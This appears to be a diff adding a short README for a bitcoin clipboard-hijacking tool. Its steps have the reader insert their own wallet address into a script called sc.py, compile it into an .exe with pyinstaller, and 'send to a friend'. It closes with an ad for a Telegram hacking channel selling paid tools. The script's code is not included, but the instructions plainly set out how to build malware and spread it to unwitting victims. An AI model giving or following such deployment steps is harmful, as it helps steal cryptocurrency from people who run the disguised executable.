@@ -1,0 +1,11 @@
+﻿1.Install Python 3.9+ 
+2. Install the get-pip.py file here - https://bootstrap.pypa.io/get-pip.py 
+3. Start it by clicking on the pkm file -> edit with idle -> F5 
+4. Enter  to the command line "python -m pip install clipboard" 
+5. Open the file.  
+6. Replace your_btc_wallet_here with your bitcoin wallet.  
+7. Close the file.  
+8. Build the sc.py file in .exe in a way convenient for you (for example, via pyinstaller using the command "python -m pyinstaller -F [path to sc.py file]") 
+9. Send to a friend :)
+
+For more incredible and paid tool join : Hackfreaks official :https://t.me/joinchat/VvhXap1BZUN6Ccv3
